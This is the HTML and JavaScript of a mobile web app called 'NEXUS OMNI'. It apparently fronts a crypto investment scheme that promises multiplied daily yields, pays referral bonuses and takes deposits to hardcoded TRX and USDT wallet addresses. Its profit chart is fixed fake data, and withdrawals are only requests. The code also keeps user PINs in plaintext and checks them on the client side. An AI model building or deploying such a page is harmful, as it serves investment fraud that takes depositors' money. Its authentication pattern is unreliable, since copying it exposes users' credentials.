<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS OMNI | Fixed Visibility</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
        
        /* Fixed Root Colors */
        :root { --n-blue: #2563eb; --n-dark: #0f172a; }

        body { 
            background: #f8fafc; 
            color: #0f172a !important; /* Force Dark Text */
            font-family: 'Plus Jakarta Sans', sans-serif; 
            -webkit-tap-highlight-color: transparent; 
        }
        
        /* Visible Cards */
        .glass-card { 
            background: #ffffff !important; 
            border-radius: 35px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.08); 
            border: 1px solid #e2e8f0; 
        }

        /* Fixed Invisible Text */
        p, h1, h2, h3, h4, span { color: #0f172a !important; }
        .text-slate-400, .text-slate-500 { color: #64748b !important; } /* Darker slate for visibility */
        
        /* Input Visibility */
        .input-prime { 
            background: #ffffff !important; 
            color: #0f172a !important; 
            border: 2px solid #cbd5e1 !important; 
            border-radius: 22px; 
            padding: 18px; 
            width: 100%; 
            font-weight: 700; 
        }

        /* Node Card Fix */
        .node-card { 
            background: #ffffff !important; 
            border-radius: 30px; 
            display: flex; 
            height: 155px; 
            box-shadow: 0 4px 20px rgba(0,0,0,0.05); 
            margin-bottom: 20px; 
            border: 1px solid #f1f5f9; 
            overflow: hidden;
        }
        
        .node-info h4 { color: #0f172a !important; font-size: 14px; font-weight: 800; }
        .node-info p { color: #10b981 !important; } /* Yield color */

        /* Nav Fix */
        nav { background: #ffffff !important; border-top: 1px solid #e2e8f0; }
        .nav-link { color: #94a3b8 !important; }
        .nav-link.active { color: #2563eb !important; }
        .nav-link i { display: block; margin-bottom: 4px; }

        .btn-prime { background: #0f172a !important; color: #ffffff !important; border-radius: 22px; font-weight: 800; padding: 18px; width: 100%; }

        /* Dashboard Specific Text */
        .stat-label { color: #94a3b8 !important; font-size: 10px; font-weight: 800; letter-spacing: 2px; }
        .stat-value { color: #ffffff !important; } /* Only white on dark cards */
        
        #preloader { position: fixed; inset: 0; background: #fff; z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
    </style>
</head>
<body>

    <div id="preloader">
        <div class="w-14 h-14 border-4 border-slate-100 border-t-blue-600 rounded-full animate-spin"></div>
        <p class="mt-4 text-[10px] font-black text-slate-900 uppercase tracking-widest">Optimizing Display...</p>
    </div>

    <div id="auth-view" class="min-h-screen flex items-center justify-center p-8 bg-slate-50">
        <div class="max-w-md w-full space-y-10">
            <div class="text-center">
                <h1 class="text-6xl font-black italic tracking-tighter">NEXUS<span class="text-blue-600">.</span></h1>
            </div>
            <div id="login-box" class="glass-card p-10 space-y-6">
                <input type="text" id="l-user" placeholder="Account ID" class="input-prime">
                <input type="password" id="l-pass" placeholder="Security PIN" class="input-prime">
                <button onclick="login()" class="btn-prime">Login</button>
                <p onclick="toggleAuth(true)" class="text-center text-[11px] font-black text-blue-600 uppercase cursor-pointer">Register Account</p>
            </div>
            <div id="signup-box" class="glass-card p-10 space-y-6 hidden">
                <input type="text" id="s-user" placeholder="Account ID" class="input-prime">
                <input type="password" id="s-pass" placeholder="PIN" class="input-prime">
                <button onclick="signup()" class="btn-prime">Sign Up</button>
                <p onclick="toggleAuth(false)" class="text-center text-[11px] font-black text-slate-500 uppercase cursor-pointer">Back to Login</p>
            </div>
        </div>
    </div>

    <div id="main-view" class="hidden pb-44">
        <header class="p-6 sticky top-0 z-50 bg-white border-b border-slate-100 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <div id="logo-trigger" class="w-14 h-14 bg-slate-900 text-white rounded-[20px] flex items-center justify-center text-2xl font-black">N</div>
                <div>
                    <p id="display-name" class="text-sm font-black uppercase">---</p>
                    <div id="kyc-badge" class="text-[9px] font-black uppercase px-2 py-1 rounded-md bg-amber-100 text-amber-700 mt-1">Pending KYC</div>
                </div>
            </div>
            <a href="https://t.me/your_link" target="_blank" class="w-12 h-12 rounded-2xl bg-blue-50 text-blue-600 flex items-center justify-center text-xl shadow-sm"><i class="fa-brands fa-telegram"></i></a>
        </header>

        <main id="tab-home" class="p-6 space-y-8">
            <div class="glass-card p-10 bg-slate-900 !text-white relative overflow-hidden">
                <p class="stat-label uppercase">Available Liquidity</p>
                <h2 id="ui-bal" class="text-5xl font-black mt-3 tracking-tighter text-white !important">$0.00</h2>
                
                <div class="h-[100px] mt-4"><canvas id="hashChart"></canvas></div>

                <div class="mt-8 pt-8 border-t border-white/10 flex justify-between">
                    <div>
                        <p class="stat-label">YIELD STATUS</p>
                        <p id="ui-prof" class="text-2xl font-black text-emerald-400">+$0.00</p>
                    </div>
                    <div class="text-right">
                        <p class="stat-label">SECURITY CODE</p>
                        <p id="anti-phish" class="text-xs font-black text-blue-400">NX-0000</p>
                    </div>
                </div>
            </div>

            <div class="flex gap-4 overflow-x-auto pb-2 no-scrollbar">
                <div class="bg-white p-6 rounded-[30px] min-w-[150px] shadow-sm border border-slate-200">
                    <p class="text-[10px] font-black text-emerald-600 uppercase">Bronze Tier</p>
                    <p class="text-sm font-black mt-2 text-slate-900">1.2x Daily</p>
                </div>
                <div class="bg-white p-6 rounded-[30px] min-w-[150px] shadow-sm border border-slate-200">
                    <p class="text-[10px] font-black text-blue-600 uppercase">Silver Tier</p>
                    <p class="text-sm font-black mt-2 text-slate-900">1.8x Daily</p>
                </div>
                <div class="bg-white p-6 rounded-[30px] min-w-[150px] shadow-sm border border-slate-200">
                    <p class="text-[10px] font-black text-amber-600 uppercase">Gold Tier</p>
                    <p class="text-sm font-black mt-2 text-slate-900">2.5x Daily</p>
                </div>
            </div>

            <div class="glass-card p-8 bg-blue-600 flex justify-between items-center shadow-lg">
                <div class="text-white">
                    <h4 class="font-black uppercase text-sm !text-white">Affiliate Hub</h4>
                    <p class="text-[10px] font-bold opacity-80 !text-white">Earn 12% Per Invite</p>
                </div>
                <button onclick="copyRef()" class="bg-white text-blue-600 px-6 py-3 rounded-2xl text-[10px] font-black uppercase">Invite</button>
            </div>

            <h3 class="text-[12px] font-black text-slate-500 uppercase tracking-widest ml-2">Active Protocols</h3>
            <div id="active-list" class="space-y-4"></div>
        </main>

        <main id="tab-nodes" class="p-6 hidden">
            <h3 class="text-lg font-black uppercase mb-6 text-slate-900">Infrastructure Nodes</h3>
            <div id="retail-box" class="space-y-4"></div>
        </main>

        <main id="tab-bank" class="p-6 space-y-8 hidden">
            <div class="glass-card p-8 space-y-6">
                <h3 class="text-xs font-black uppercase text-blue-600">Deposit Capital</h3>
                <select id="d-asset" class="input-prime" onchange="updAddr()">
                    <option value="">Select Asset</option>
                    <option value="TRX">TRX (TRC20)</option>
                    <option value="USDT">USDT (TRC20)</option>
                </select>
                <div id="d-panel" class="hidden space-y-6">
                    <p id="addr-txt" class="text-[12px] font-mono font-black text-blue-700 p-5 bg-blue-50 rounded-[25px] break-all text-center border-2 border-blue-100"></p>
                    <input type="number" id="d-amt" placeholder="Amount ($)" class="input-prime">
                    <input type="text" id="d-tid" placeholder="Transaction Hash ID" class="input-prime">
                    <button onclick="sendD()" class="btn-prime">Submit Deposit</button>
                </div>
            </div>

            <div class="glass-card p-8 space-y-6 border-t-8 border-slate-900">
                <h3 class="text-xs font-black uppercase text-slate-500">Withdraw Funds</h3>
                <input type="number" id="w-amt" placeholder="Amount ($)" class="input-prime">
                <input type="text" id="w-acc" placeholder="Wallet / Bank Address" class="input-prime">
                <button onclick="sendW()" class="btn-prime !bg-blue-600">Request Withdrawal</button>
            </div>
        </main>

        <main id="tab-ledger" class="p-6 hidden"><div id="ledger-box" class="space-y-4"></div></main>

        <nav class="fixed bottom-0 left-0 right-0 h-24 bg-white flex justify-around items-center px-4 z-[1000]">
            <div onclick="nav('home')" class="nav-link active"><i class="fa-solid fa-chart-pie text-2xl"></i><br>HOME</div>
            <div onclick="nav('nodes')" class="nav-link"><i class="fa-solid fa-server text-2xl"></i><br>NODES</div>
            <div onclick="nav('bank')" class="nav-link"><i class="fa-solid fa-wallet text-2xl"></i><br>BANK</div>
            <div onclick="nav('ledger')" class="nav-link"><i class="fa-solid fa-list-ul text-2xl"></i><br>LEDGER</div>
        </nav>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const config = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(config);
        const db = getDatabase(app);

        const nodeData = Array.from({length: 15}, (_, i) => ({ 
            id: `r${i}`, name: `Nexus Pro v${i+1}`, price: 150 + (i*350), daily: 25 + (i*45), 
            img: `https://images.unsplash.com/photo-1518770660439-4636190af475?w=300&sig=n${i}` 
        }));

        window.onload = () => {
            renderNodes();
            initChart();
            setTimeout(() => document.getElementById('preloader').style.display='none', 800);
            const user = localStorage.getItem('nx_usr');
            if(user) startSession(user);
        };

        function initChart() {
            const ctx = document.getElementById('hashChart').getContext('2d');
            new Chart(ctx, {
                type: 'line',
                data: { labels: ['', '', '', '', '', '', ''], datasets: [{ data: [40, 60, 50, 80, 60, 90, 70], borderColor: '#3b82f6', tension: 0.4, borderWidth: 3, pointRadius: 0, fill: false }]},
                options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false }}, scales: { x: { display: false }, y: { display: false }}}
            });
        }

        window.login = async () => {
            const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value;
            const s = await get(ref(db, `users/${u}`));
            if(s.exists() && s.val().password === p) { localStorage.setItem('nx_usr', u); startSession(u); } else alert("Error.");
        };

        window.signup = async () => {
            const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value;
            if(u && p) { await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0, kyc: 'Pending', phishCode: 'NX-'+Math.floor(1000+Math.random()*9000) }); toggleAuth(false); }
        };

        function startSession(uid) {
            document.getElementById('auth-view').classList.add('hidden');
            document.getElementById('main-view').classList.remove('hidden');
            document.getElementById('display-name').innerText = uid;
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('ui-bal').innerText = '$' + (d.balance || 0).toLocaleString();
                document.getElementById('ui-prof').innerText = '+$' + (d.profit || 0).toLocaleString();
                document.getElementById('anti-phish').innerText = d.phishCode || 'NX-4421';
                document.getElementById('kyc-badge').innerText = d.kyc === 'Verified' ? 'Verified Account' : 'Pending KYC';
                
                const active = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-list').innerHTML = active.map(([k, v]) => `
                    <div class="glass-card p-6 flex justify-between items-center border-l-8 border-blue-600">
                        <p class="font-black uppercase text-slate-800">${v.name}</p>
                        <i class="fa-solid fa-circle-notch fa-spin text-blue-600"></i>
                    </div>`).join('') || '<p class="text-center py-5 text-slate-400 font-bold uppercase text-[10px]">No protocols online</p>';
            });
        }

        window.renderNodes = () => {
            document.getElementById('retail-box').innerHTML = nodeData.map(n => `
                <div class="node-card">
                    <img src="${n.img}" class="w-[120px] object-cover">
                    <div class="node-info p-5 flex-1">
                        <h4 class="font-black uppercase">${n.name}</h4>
                        <p class="text-[10px] font-black mt-1">Daily: $${n.daily}</p>
                        <div class="flex justify-between items-center mt-3">
                            <span class="text-xl font-black text-slate-900">$${n.price}</span>
                            <button onclick="buyNode('${n.id}', ${n.price}, '${n.name}')" class="bg-blue-600 text-white text-[9px] font-black px-4 py-2 rounded-xl">DEPLOY</button>
                        </div>
                    </div>
                </div>`).join('');
        };

        window.nav = (p) => { ['home','nodes','bank','ledger'].forEach(x => document.getElementById('tab-'+x).classList.add('hidden')); document.getElementById('tab-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-link').forEach(i => i.classList.remove('active')); event.currentTarget.classList.add('active'); };
        window.updAddr = () => { const m = document.getElementById('d-asset').value, map = { "TRX": "TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76", "USDT": "TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ" }; document.getElementById('addr-txt').innerText = map[m] || ""; document.getElementById('d-panel').classList.toggle('hidden', !m); };
        window.toggleAuth = (s) => { document.getElementById('login-box').classList.toggle('hidden', s); document.getElementById('signup-box').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.copyRef = () => { alert("Referral Link Copied!"); };
    </script>
</body>
</html>
